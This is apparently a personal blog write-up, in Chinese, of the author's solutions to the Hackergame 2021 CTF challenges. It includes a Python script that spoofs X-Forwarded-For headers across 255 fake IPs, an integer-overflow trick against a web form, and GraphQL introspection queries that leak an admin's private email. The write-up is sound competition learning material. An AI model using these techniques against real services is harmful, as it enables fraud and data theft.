# Preface

今年比 [去年](https://blog.tinyume.com/2020/2020-hackergame-writeup/) 高了 500 分，但是 "简单题" 的难度明显比去年高，难度梯度更小（平均）了。

此文章同时发布于 [我的博客](https://blog.tinyume.com/2021/hackergame2021-writeup/)

# 题目

## 1. 签到

> 类型: web
>
> 耗时: 20s

进入网页，首先点一下 `next`，发现 url 变成了 `http://202.38.93.111:10000/?page=1`。马上可以想到 query parameter `page` 是时间戳。

直接进入 Python Interpreter，执行

```python
>>> import time
>>> time.time()
1635489757.9277494
```

此时不知道时间戳是 9 位还是 13 位的，但是先把 9 位的拿上去试试。

exp: `http://202.38.93.111:10000/?page=1635489757`

得到 flag{HappyHacking2021-a95dcfa4bd}

## 2. 进制十六 -- 参上

> 类型: general
>
> 耗时: 2min

hex to ascii，搞定！

时间主要花费在把图里的 hex 一个个手动提取出来了。

打开解释器

```python
>>> ''.join([chr(i) for i in (0x7b,0x59,0x30,0x55,0x5f,0x53,0x48,0x30,0x55,0x31,0x44,0x5f,0x6b,0x6e,0x30,0x77,0x5f,0x48,0x30,0x57,0x5f,0x74,0x30,0x5f,0x43,0x30,0x6e,0x76,0x33,0x72,0x74,0x5f,0x48)])
'{Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_H'
>>> ''.join([chr(i) for i in (0x45,0x58,0x5f,0x74,0x6f,0x5f,0x54,0x65,0x78,0x54,0x7d,0x20,0x46,0x6f,0x72)])
'EX_to_TexT} For'
```

flag{Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_HEX_to_TexT}

## 3. 去吧！追寻自由的电波

> 类型: general
>
> 耗时: inf

Audacity 拖入音频，观察波形发现没啥特征。

题目提到了 "使得最终接受到的录音的速度有所改变"，可以说明音频文件的速度是不正确的。

将采样率下调，当调为 16000Hz 时，可以听出来了一些很清晰的英文单词，然后直接导出。

将听到的单词提取出来分组，就可以得到 foxtrot, leaner, alpha, golf, left bracket, proper, hotel, ostreet, november, echo, tango, india, charlie, alpha, brago, right bracket

`left bracket` 和 `right bracket` 对应 flag 的两个花括号。`left bracket` 前面四个单词提取首字母就是 flag，因此推测将括号内的单词取首字母就是 flag 的主体了。

flag{phoneticab}

第一天脑袋卡住了，第二天才想出此题的解法。

## 4. 猫咪问答 Pro Max

> 类型: general
>
> 耗时: 20min

1. 2017 年，中科大信息安全俱乐部（SEC@USTC）并入中科大 Linux 用户协会（USTCLUG）。目前，信息安全俱乐部的域名（sec.ustc.edu.cn）已经无法访问，但你能找到信息安全俱乐部的社团章程在哪一天的会员代表大会上通过的吗？

    看到此题第一时间想到 https://web.archive.org/

    答案: 20150504

    Ref: https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes

2. 中国科学技术大学 Linux 用户协会在近五年多少次被评为校五星级社团？

    保留此题。

3. 中国科学技术大学 Linux 用户协会位于西区图书馆的活动室门口的牌子上“LUG @ USTC”下方的小字是？

    答案: Development Team of Library

    Ref: https://news.ustclug.org/2016/06/new-activity-room-in-west-library/

4. 在 SIGBOVIK 2021 的一篇关于二进制 Newcomb-Benford 定律的论文中，作者一共展示了多少个数据集对其理论结果进行验证？

    答案: 13

    Ref: http://sigbovik.org/2021/proceedings.pdf

5. 不严格遵循协议规范的操作着实令人生厌，好在 IETF 于 2021 年成立了 Protocol Police 以监督并惩戒所有违背 RFC 文档的行为个体。假如你发现了某位同学可能违反了协议规范，根据 Protocol Police 相关文档中规定的举报方法，你应该将你的举报信发往何处？

    答案: /dev/null

    Ref: https://www.rfc-editor.org/rfc/rfc8962.html#section-6

    （别啥都往 /dev/null 塞啊 kora

最后，5 题有 4 题解出来了，剩 1 题可简单遍历，那么直接打开 hackbar 是最快的。此题没有任何遍历脚本。

和往年一样，此题考察搜索引擎的使用，还是挺不错的，出题比去年好一点。

flag{8804d9f3_7320de5724}

## 5. 卖瓜

> 类型: web
>
> 耗时: 1h

严格来说不算 web 题。偏 misc。

首先 f12，发现 input 设置了 min，给它改成 -1 并把 value 设为 -1，提交后跳转到一个纯文本页面: `操作无效：不能放负数个瓜。点击这里回到主页。`

然后尝试把 type 改成 text，依次输入 `-1`, `1+1`, `1.5`, `'1'.'1'` 发现都没有得到预期行为，因此 value 的简单 payload 是行不通的。

然后注意到 input 框的命名是 `b6`, `b9` 的形式，那尝试改成 `b2` 或者其他数字是否能提交不同斤数的瓜，提交后 trackback 马上显示了出来。

```
Warning: Undefined array key "b6" in /mnt/app/index.php on line 63

Warning: Cannot modify header information - headers already sent by (output started at /mnt/app/index.php:63) in /mnt/app/index.php on line 69
```

比赛第一天我以为这是 php 代码漏洞注入题，然后就没做了。

比赛第二天题目解的都差不多了，实在没有题可以解了。回来看这题的时候，随便输了几个大数字，然后发现，我超，原来有 overflow！

（下面以 b6 代指 6 斤瓜，b9 代指 9 斤瓜）

仔细摸索了一下，可以发现

- 电子枰上的数字是 bigint
- b6 合算斤数高于 int64 会被当成 0
- b9 输入为 1024819115206086200 时，电子枰正确地加上了 9223372036854775800 斤；而输入高于上面这个值，也就是合算斤数高于 int64 时，值会突然变成 -9223372036854775808 并且保持不变

-9223372036854775808 并不被 6 或 9 整除

理解到这一步，后面的步骤就很简单了

在 b9 框输入个很大的数先把 -9223372036854775808 这个数字弄出来，然后在 b6 或 b9 构造合算斤数不超过 int64 的数字加在上面的负的斤数上。

拿 b9 举例，我在 b9 输入 1024819115206086200 提交，然后电子枰读数就变成了 -8/20 斤。重复以上步骤，得到 -16/20 斤。36 % 6 = 0，直接拿 6 个 b6 加在电子枰上就完成了此题。

flag{HUAQIANG!HUAQIANG!_78b45b2322}

## 6. 透明的文件

> 类型: general
>
> 耗时: 30min

打开文件，大概长下面这样，行数 1，有 17590 个字符。

```
[0;0H[20;58H[8;34H[13;27H[4;2H[38;2;1;204;177m [39m[14;10H[20;51H[23;4H[12;2H[38;2;2;207;173m [39m[19;61H[9;12H[22;8H[20;2H[38;2;3;210;169m [39m[3;23H[8;68H[19;10H[4;3H[38;2;4;214;165m
```

作为一个熟悉 Linux 的人不可能不知道上面这个是什么，所以我一眼认出来了这是 bash colorize prompt

不知道的人可以看 [这里](https://wiki.archlinux.org/title/Bash_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)/Prompt_customization_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))

之前我写过 oh-my-posh 的 [终端美化](https://blog.tinyume.com/2021/terminal-prettify-guideline/)，而在这之前我都是使用原始的 PS1 来控制 prompt 的。

了解文件内容:

- 一个颜色标识符应该形如 `\e[<color code>m`，而颜色的结束标识符为 `\e[39m`

- 一个光标跳转标识符应该形如 `\e[<row>,<column>H`，表示将光标移动到 `<row>` 行、`<column>` 列

再看源文件，显然缺少了 `\e` 这个前缀；没有看到 set background 的代码，那么就把 `<space>` 换成可辨识字符即可。

文件修复:

- 将 `[` 全部替换为 `\e[` 或者 `\003[`
- 将 `<space>`（空格） 全部替换为 `#`

文件修好啦。进入 shell

```shell
nano ~/.bashrc
```

`^w` 搜索 `export ps1`，或者在最后一行添加 `export PS1=""`

如果原来有内容的话，建议注释掉而不要删除，以免引发混乱。

把修复好的文件内容全部复制到双引号内，保存退出。

执行

```shell
source ~/.bashrc
clear
```

![](https://i.loli.net/2021/10/30/GCzN9DujMl5vLUJ.png)

题目给了提示，内容全是小写字母，那么就是 flag{abxnniohkalmcowsayfiglet}

## 8. FLAG 助力大红包

> 类型: general
>
> 耗时: 2h

此题常规思路是绕过 ip 验证，只要绕过了就可以构造任意 ip 助力大红包。

> 非常规解法: 如果你或者你认识的人在 `/8` 每个子网都有代理机，包括 `0.0.0.0/8`（懂不懂什么叫人脉啊？），那你可以用最快（x）的方式结束此题。

回到常规解法，首先 f12 看助力按钮

```html
<form class="form-inline" method="POST">
    <input type="hidden" name="ip" id="ip">
    <button type="submit" class="btn btn-danger ml-2">点击按钮，为您的好友助力</button>
</form>
```

可以得知点击按钮的时候，页面 post 了当前 ip，这是前端验证。

前端验证的绕过方法很简单，打开 hackbar，构造 Post data `ip=1.1.1.1`，执行后弹出警告 `失败！检测到前后端检测 IPv4 地址不匹配，前端地址： 1.1.1.1 ，后端地址： 111.27.47.10 。疑似地址伪造！`。从这个 "温情提示" 可以看出前端成功绕过了。

接下来绕过后端验证，首先尝试伪造 http header，此处可以伪造的只有 `X-Forwarded-For`。这个 header 的作用是在代理访问时保留自己的源 ip 供服务器识别。

在 hackbar 选择 `Add Header`，添加 `X-Forwarded-For: 1.1.1.1`，Post data `ip=1.1.1.1`

得到回显: `助力成功！您的 IPv4 地址是： 1.1.1.1 ，成功共同打造世界一流大砍刀！`

绕过很简单，不是么？

活动规则提到了 `活动要求位于同一 /8 网段的用户将会被视为同一个用户`，而 `/8` 网段对应掩码 `255.0.0.0`，表示共有 255 个子网，需要请求 255 次，显然手工在 10min 内完成是不可能的，也不方便解题。

于是尝试写请求脚本。payload 就是伪造的 ip pool

首先需要测试请求间隔，间隔过短的话请求会被拒绝，最后得出的间隔为 `1s`

然后是对于助力成功的判断、对助力重复的判断，这两种情况都要把 ip 从 ip pool 移除

response status_code 都是 200，显然不能从这里判断，那么只能从文本回显来判断了。

回显有如下 4 种

- 助力成功！您的 IPv4 地址是： 0.1.1.1 ，成功共同打造世界一流大砍刀！
- 失败！重复的 /8 地址： 1.1.1.1 。
- 失败！操作速度太快了，请稍后再试！

下面是我写的脚本

```python
import requests  # type: ignore
from time import sleep
from ipaddress import IPv4Address


url = 'http://202.38.93.111:10888/invite/2a1abf61-fb9b-456d-bac7-1e14e138e2b2'

f_ip = '{}.1.1.1'

ip_set = {*()}


for i in range(1, 256):
    ip = f_ip.format(i)
    ip_set.add(ip)


while ip_set:
    for ip in ip_set.copy():
        sleep(1)
        response = requests.post(url, data={'ip': str(ip)}, headers={'X-Forwarded-For': str(ip)})
        content = response.content.decode()
        if '助力成功' in content or '重复' in content:
            ip_set.remove(ip)
            continue
    print({i.split('.', 1)[0] for i in ip_set})
    print(f'剩余 ip 数量: {len(ip_set)}')
```

但是执行完毕发现 flag 并没有达到 1，但是很接近了，可能缺的只有 1 个 ip。

直接 hackbar 请求，找到了漏网的 ip `0.1.1.1`

至此 256 个助力完成了（成功打造世界一流大砍刀）

flag{r3d-enve10p3-9df0e42771}

## 9. Amnesia

> 类型: binary

### 9.1 轻度失忆

> 耗时: 30min

时间大多花在了阅读 [ELF 文件结构](https://ctf-wiki.org/executable/elf/structure/basic-info/)

源代码编译时，字符串这样的常量会被存储在 .rodata 内，而分配了空间的变量会被存储在 .data 内，像是 extern 这种不分配空间的符号是没有占用的，.text 存储的是表达式之类的东西。

而此题提到 .rodata 和 .data 段都会被清除，那么目的就是不使用字符串常量和变量来输出 `Hello world!`

先编写一个简单的程序

```c
#include "stdio.h"

int main() {
    printf("Hello, world!");
    return 0;
}
```

`gcc -o helloworld helloworld.c` 编译出可执行文件

`objdump -s helloworld` 查看 ELF 文件结构

然后看下结构内的 .rodata 段

```
Contents of section .rodata:
 2000 01000200 48656c6c 6f20776f 726c6421  ....Hello world!
 2010 00                                   .
```

看到了 `Hello world!`，意料之内。

然后尝试编写

```c
#include "stdio.h"

int main() {
    putchar('H');
    putchar('e');
    putchar('l');
    putchar('l');
    putchar('o');
    putchar(',');
    putchar(' ');
    putchar('w');
    putchar('o');
    putchar('r');
    putchar('l');
    putchar('d');
    putchar('!');
    return 0;
}
```

编译可执行然后看 .rodata

```
Contents of section .rodata:
 2000 01000200                             ....
```

很好！没有 `Hello world!` 了。

把代码送上网页终端，得到 flag{S0_S1mp1e_r1ght_5d6537dcc8}

### 9.2 记忆清除

没做，识趣地离开了。

## 10. 图之上的信息

> 类型: web
>
> 耗时: 2h

我觉得是今年 hackergame 最有意思的一道题了，寓教于乐。

首先看看啥是 [GraphQL](https://graphql.org/learn/)

以及请求一个 GraphQL API 的 [方法](https://graphql.org/learn/serving-over-http/)

再仔细翻看 GraphQL 文档，可以发现这么一个 [特殊的页面](https://graphql.org/learn/introspection/)。它提到了如何查询内部数据库的信息，根据这个页面首先尝试一下请求所有的 Type

> 下面的请求 Url 都是 `http://202.38.93.111:15001/graphql`

打开 Postman

> 注意，你首先得访问 `http://202.38.93.111:15001/?token=<your token>` 获取 cookie 才能使用 query

我这里使用 POST 的请求方法，你也可以使用 GET，无所谓

构造 Body，选择 json

```
{
    "query": "{__schema{types{name}}}"
}
```

然后发送 POST 请求

回显

```json
{
    "data": {
        "__schema": {
            "types": [
                {
                    "name": "Query"
                },
                {
                    "name": "GNote"
                },
                {
                    "name": "Int"
                },
                {
                    "name": "String"
                },
                {
                    "name": "GUser"
                },
                {
                    "name": "Boolean"
                },
                {
                    "name": "__Schema"
                },
                {
                    "name": "__Type"
                },
                {
                    "name": "__TypeKind"
                },
                {
                    "name": "__Field"
                },
                {
                    "name": "__InputValue"
                },
                {
                    "name": "__EnumValue"
                },
                {
                    "name": "__Directive"
                },
                {
                    "name": "__DirectiveLocation"
                }
            ]
        }
    }
}
```

发生了什么？这些返回是啥啊？？

GraphQL 设计了类型系统，一切皆为类型，一个 API 查询由简单类型构成，也可以由嵌套类型构成，但类型的字段最终分为基本 `Int`, `String`, `Boolean`。

上面的 payload 获取的就是所有的 type，其中包含了很多 GraphQL 内置的类型可以忽略。其中对我们有用的信息只有形如 `GNote`, `GUser` 这样的类型名字。

知道了类型名字后就可以查询 `GUser` 这个类型的字段有哪些了。

构造 Body

```json
{
    "query": "{__type(name:\"GUser\"){name fields{name type{name}}}}"
}
```

回显

```json
{
    "data": {
        "__type": {
            "name": "GUser",
            "fields": [
                {
                    "name": "id",
                    "type": {
                        "name": "Int"
                    }
                },
                {
                    "name": "username",
                    "type": {
                        "name": "String"
                    }
                },
                {
                    "name": "privateEmail",
                    "type": {
                        "name": "String"
                    }
                }
            ]
        }
    }
}
```

于是我们知道了 `GUser` 的 schema，将其简记为

```python
class GUser:
    id: int
    username: str
    privateEmail: str
```

光知道类型还不够，接下来还得知道有哪些东西是可以查询的。

就像 `types` 内置在 `__schema` 内，`__schema` 也包含一个字段叫做 `queryType`，用于查询可用 query。不过这个 `queryType` 实际上是个名为 `Query` 的类型，也就是说使用 `__type` 也可以查询到它的字段。

构造 Body

```json
{
    "query": "{__type(name:\"Query\"){name fields{name type{name}}}}"
}
```

或者

```json
{
    "query": "{__schema{queryType{name fields{name type{name} description}}}}"
}
```

POST，得到回显

```json
{
    "data": {
        "__schema": {
            "queryType": {
                "name": "Query",
                "fields": [
                    {
                        "name": "note",
                        "type": {
                            "name": "GNote"
                        },
                        "description": "Get a specific note information"
                    },
                    {
                        "name": "notes",
                        "type": {
                            "name": null
                        },
                        "description": "Get notes information of a user"
                    },
                    {
                        "name": "user",
                        "type": {
                            "name": "GUser"
                        },
                        "description": "Get a specific user information"
                    }
                ]
            }
        }
    }
}
```

知道了 query name，就可以构造用户查询 payload 了。不过注意这个查询是 `Get a specific user information`，也就是说 argument 是至少需要一个的，否则会返回 NoneType，但是此时我们不知道这个 queryType 有啥 argument，我们知道的只有示例的 username

尝试构造 Body

```json
{
    "query": "{user(username:Guest){username,privateEmail}}"
}
```

回显

```json
{
    "errors": [
        {
            "message": "Unknown argument 'username' on field 'Query.user'.",
            "locations": [
                {
                    "line": 1,
                    "column": 7
                }
            ],
            "path": null
        }
    ]
}
```

那么换个 argument 试试

尝试构造 Body

```json
{
    "query": "{user(id:1){username,privateEmail}}"
}
```

回显

```json
{
    "data": {
        "user": {
            "username": "admin",
            "privateEmail": "flag{dont_let_graphql_l3ak_data_9f34dccd08@hackergame.ustc}"
        }
    }
}
```

搞定！flag{dont_let_graphql_l3ak_data_9f34dccd08@hackergame.ustc}

## 13. 赛博厨房

> 类型: general

### 13.1 Level 0

> 耗时: 5min

很简单，直接给 payload

```
向右 2 步
拿起 1 个物品
向下 1 步
向左 2 步
放下 1 个物品
向上 1 步
向右 1 步
拿起 1 个物品
向下 1 步
向左 1 步
放下 1 个物品
```

### 13.2 Level 1

> 耗时: 20min

先看看有多少个 0

```python
>>> len([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0])
73
```

payload 就是

```
向右 1 步
拿起 73 个物品
向下 1 步
向左 1 步
放下 1 个物品
如果手上的物品大于等于 1 向上跳转 1 行
```

值得一提的是 `如果手上的物品大于等于 n 向上跳转 m 行` 表示的是一个 if-goto 语句，把当前执行权交给向上 m 行的代码，再向下执行。

### 13.3 / 13.4

没做

# 总结

截止至 2021-10-30 01:31:06，排名为 236 / 2677

解题时间的消耗明显比去年短了，今年是从 2021-10-23 晚上开始 CTF，得到了 5 个 flag，于 2021-10-24 获取了能力范围内的所有 flag，后面就没做了，两天完成了这篇博文的所有解题。

能解出来的题目也比去年多了，有了那种得心应手的感觉。（被其他 CTF 比赛虐死的菜鸡的自述）

今年的题目做起来真的挺开心的，明年应该也会参加。

math 题今年也是一分没拿，明年争取一下吧。（虽然买了基本操作密码学但是看不懂的菜鸡怎么可能会手算因数呢？）

> 贴图不多，主要是图床管理太烂了，又没时间自己写
